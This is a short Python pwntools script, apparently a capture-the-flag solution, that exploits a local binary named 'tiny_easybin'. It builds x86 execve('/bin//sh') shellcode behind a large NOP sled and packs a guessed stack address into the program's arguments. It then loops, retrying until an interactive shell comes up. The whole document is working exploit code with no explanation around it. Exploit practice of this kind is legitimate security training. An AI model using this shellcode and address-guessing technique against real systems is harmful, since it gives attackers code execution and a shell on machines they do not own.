#!/usr/bin/env python3
from pwn import *
import struct

gscript = '''
b * 0x8048056
'''


shellcode = \
b"\x31\xc0\x50\x68\x2f\x2f\x73"\
b"\x68\x68\x2f\x62\x69\x6e\x89"\
b"\xe3\x89\xc1\x89\xc2\xb0\x0b"\
b"\xcd\x80\x31\xc0\x40\xcd\x80"

shellcode = b'\x90'* 0x7fff + shellcode


counter = 0
while True:
    print('try', counter)
    io = process(argv=[struct.pack('<I', 0xffde6048), shellcode ,shellcode,shellcode ,shellcode,shellcode ,shellcode,shellcode ,shellcode,shellcode ,shellcode,shellcode ,shellcode,shellcode ,shellcode,shellcode ,shellcode,shellcode ,shellcode,shellcode ,shellcode, 'CCCC'], executable='./tiny_easybin')
    io.interactive()
    
    # io.wait_for_close()
    counter += 1

    try:
        io.close()
    except Exception as e:
        pass
    